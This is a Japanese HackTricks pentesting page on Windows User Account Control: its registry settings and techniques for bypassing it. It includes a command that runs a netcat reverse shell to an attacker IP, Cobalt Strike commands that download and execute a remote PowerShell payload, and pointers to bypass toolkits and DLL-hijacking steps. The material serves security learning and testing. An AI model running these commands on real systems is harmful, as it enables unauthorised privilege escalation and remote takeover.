# UAC - ユーザーアカウント制御

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使用して、ゼロからヒーローまでAWSハッキングを学ぶ</summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[Telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦で**@carlospolopm**をフォローする
- ハッキングテクニックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[ユーザーアカウント制御（UAC）](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**昇格されたアクティビティのための同意プロンプト**を有効にする機能です。アプリケーションには異なる`integrity`レベルがあり、**高いレベル**のプログラムは**システムを潜在的に危険にさらす可能性のあるタスクを実行**できます。UACが有効な場合、アプリケーションとタスクは常に、管理者が明示的にこれらのアプリケーション/タスクにシステムへの管理者レベルのアクセス権を与えることを許可するまで、管理者以外のアカウントのセキュリティコンテキストで**実行**されます。これは、管理者が意図しない変更から保護する便利な機能ですが、セキュリティの境界とは見なされません。

整合性レベルに関する詳細情報は次のとおりです：

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UACが適用されている場合、管理者ユーザーには2つのトークンが与えられます：通常のアクションを通常のレベルで実行するための標準ユーザーキーと、管理者特権を持つもの。

この[ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)では、UACの動作について詳しく説明し、ログオンプロセス、ユーザーエクスペリエンス、およびUACアーキテクチャを含んでいます。管理者は、セキュリティポリシーを使用して、ローカルレベル（secpol.mscを使用）で組織固有のUACの動作を構成したり、Active Directoryドメイン環境でグループポリシーオブジェクト（GPO）を構成して配布したりすることができます。さまざまな設定については、[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)で詳しく説明されています。UACに設定できる10のグループポリシー設定があります。次の表に追加の詳細が提供されています：

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |
### UAC Bypass Theory

一部のプログラムは、ユーザーが管理者グループに属している場合には、**自動的に昇格**されます。これらのバイナリには、_**マニフェスト**_内に _**autoElevate**_ オプションが _**True**_ という値で含まれています。また、バイナリは**Microsoftによって署名**されている必要があります。

そのため、**UAC**を**バイパス**するために（**中**の整合性レベルから**高**のレベルに昇格するために）、一部の攻撃者はこの種のバイナリを使用して**任意のコードを実行**します。なぜなら、それは**高い整合性プロセス**から実行されるからです。

バイナリの _**マニフェスト**_ を確認するには、Sysinternals のツール _**sigcheck.exe**_ を使用できます。また、プロセスの**整合性レベル**を確認するには、Sysinternals の _Process Explorer_ または _Process Monitor_ を使用できます。

### Check UAC

UACが有効になっているかどうかを確認するには、次の操作を行います：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
もし**`1`**であれば、UACは**有効**になっています。**`0`**であるか、存在しない場合は、UACは**無効**です。

次に、**どのレベル**が設定されているかを確認します：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* もし **`0`** なら、UAC はプロンプトされません（**無効**のように）
* もし **`1`** なら、管理者はバイナリを高い権限で実行する際に**ユーザー名とパスワードを要求されます**（セキュアデスクトップ上）
* もし **`2`**（**常に通知**）なら、UAC は管理者が高い権限で何かを実行しようとすると常に確認を求めます（セキュアデスクトップ上）
* もし **`3`** なら、`1`と同様ですが、セキュアデスクトップ上で必要ではありません
* もし **`4`** なら、`2`と同様ですが、セキュアデスクトップ上で必要ではありません
* もし **`5`**（**デフォルト**）なら、非 Windows バイナリを高い権限で実行する際に管理者に確認を求めます

次に、**`LocalAccountTokenFilterPolicy`** の値を確認する必要があります。\
もし値が **`0`** なら、**RID 500** ユーザー（**組み込み管理者**）だけが **UAC なしで** 管理タスクを実行でき、`1` なら **"Administrators"** グループ内のすべてのアカウントがそれを行えます。

最後に、**`FilterAdministratorToken`** キーの値を確認します。\
もし **`0`**（デフォルト）なら、**組み込み管理者アカウントが** リモート管理タスクを実行でき、`1` なら組み込みアカウント管理者は **リモート管理タスクを実行できません**（ただし、`LocalAccountTokenFilterPolicy` が `1` に設定されている場合）。

#### 要約

* `EnableLUA=0` または **存在しない** 場合、**誰にも UAC がありません**
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=1` の場合、誰にも UAC がありません**
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0` かつ `FilterAdministratorToken=0` の場合、RID 500（組み込み管理者）には UAC がありません**
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0` かつ `FilterAdministratorToken=1` の場合、誰にも UAC があります**

これらの情報は、**metasploit** モジュール: `post/windows/gather/win_privs` を使用して収集できます。

また、ユーザーのグループを確認し、整合性レベルを取得することもできます：
```
net user %username%
whoami /groups | findstr Level
```
## UACバイパス

{% hint style="info" %}
被害者へのグラフィカルアクセスがある場合は、UACバイパスは簡単です。UACプロンプトが表示されたときに単純に「はい」をクリックできます。
{% endhint %}

UACバイパスは次の状況で必要です：**UACがアクティブ化されており、プロセスが中間整合性コンテキストで実行されており、ユーザーが管理者グループに属している場合**。

重要なのは、**UACが最高セキュリティレベル（常に）にある場合は、他のレベル（デフォルト）にある場合よりもUACをバイパスするのがはるかに難しい**ということです。

### UACが無効化されている場合

UACが既に無効化されている場合（`ConsentPromptBehaviorAdmin`が**`0`**である場合）、**管理者権限（高整合性レベル）で逆シェルを実行**することができます。
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### トークン複製を使用したUACバイパス

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常に**基本的なUAC "バイパス"（完全なファイルシステムアクセス）

管理者グループに属するユーザーを持つシェルがある場合、SMB（ファイルシステム）を介してC$を**マウント**し、新しいディスク内でローカルにマウントすることができ、ファイルシステム内のすべてに**アクセスできます**（管理者のホームフォルダーさえも）。

{% hint style="warning" %}
**このトリックはもはや機能していないようです**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strikeを使用したUACバイパス

Cobalt Strikeのテクニックは、UACが最大セキュリティレベルに設定されていない場合のみ機能します。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**と**Metasploit**には、**UAC**を**バイパス**するためのいくつかのモジュールもあります。

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)にあるドキュメントとツール

### UACバイパスエクスプロイト

[**UACME**](https://github.com/hfiref0x/UACME)は、複数のUACバイパスエクスプロイトの**コンパイル**です。UACMEを**Visual StudioまたはMSBuildを使用してコンパイルする必要がある**ことに注意してください。コンパイルにより、いくつかの実行可能ファイル（`Source\Akagi\outout\x64\Debug\Akagi.exe`など）が作成されますが、**どれが必要かを知る必要があります。**\
いくつかのバイパスは、**ユーザーに何かが起こっていることを警告する他のプログラムを表示する**ことがありますので、**注意が必要**です。

UACMEには、各テクニックが動作を開始した**ビルドバージョン**があります。お使いのバージョンに影響を与えるテクニックを検索できます。
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### より多くのUACバイパス

ここで使用されているすべてのテクニックは、被害者との完全な対話シェルが必要です（一般的なnc.exeシェルでは不十分です）。

**meterpreter**セッションを取得できます。**Session**値が**1**に等しい**プロセス**に移行します：

![](<../../.gitbook/assets/image (863).png>)

（_explorer.exe_が機能するはずです）

### GUIを使用したUACバイパス

**GUIにアクセスできる場合、UACプロンプトを受け入れるだけで**バイパスすることができます。そのため、GUIにアクセスできると、UACをバイパスできます。

さらに、誰かが使用していたGUIセッション（おそらくRDP経由で）にアクセスできる場合、**管理者として実行されるツール**がいくつかあります。そのツールから直接**cmdを管理者として実行**することができ、UACに再度プロンプトされることなく実行できます。[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)のようなものがあります。これは少し**ステルス**です。

### 騒々しいブルートフォースUACバイパス

騒音を気にしない場合、常に[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)のようなものを実行して、ユーザーが許可するまで権限を昇格させるように求めることができます。

### 独自のバイパス - 基本的なUACバイパス手法

**UACME**を見ると、ほとんどのUACバイパスが**Dllハイジャック脆弱性**を悪用していることに気づくでしょう（悪意のあるdllを_C:\Windows\System32_に書き込むことが主な方法）。[Dllハイジャック脆弱性を見つける方法についてはこちらを読んでください](../windows-local-privilege-escalation/dll-hijacking/)。

1. **自動昇格**するバイナリを見つけます（実行時に高い整合性レベルで実行されることを確認します）。
2. procmonを使用して、**NAME NOT FOUND**イベントを見つけ、**DLLハイジャック**の脆弱性に対して脆弱である可能性があります。
3. おそらく、**保護されたパス**（C:\Windows\System32など）にDLLを書き込む必要があるでしょう。これには、次の方法を使用してバイパスできます：
   1. **wusa.exe**：Windows 7、8、8.1。これにより、保護されたパス内にCABファイルの内容を抽出できます（このツールは高い整合性レベルから実行されるため）。
   2. **IFileOperation**：Windows 10。
4. DLLを保護されたパスにコピーし、脆弱で自動昇格されたバイナリを実行するためのスクリプトを準備します。

### 別のUACバイパス手法

**自動昇格バイナリ**が**レジストリ**から**実行されるバイナリ**または**コマンド**の**名前/パス**を**読み取ろうとするかどうか**を監視することで構成されます（この情報を**HKCU**内で検索する場合、より興味深いです）。

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**できます。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
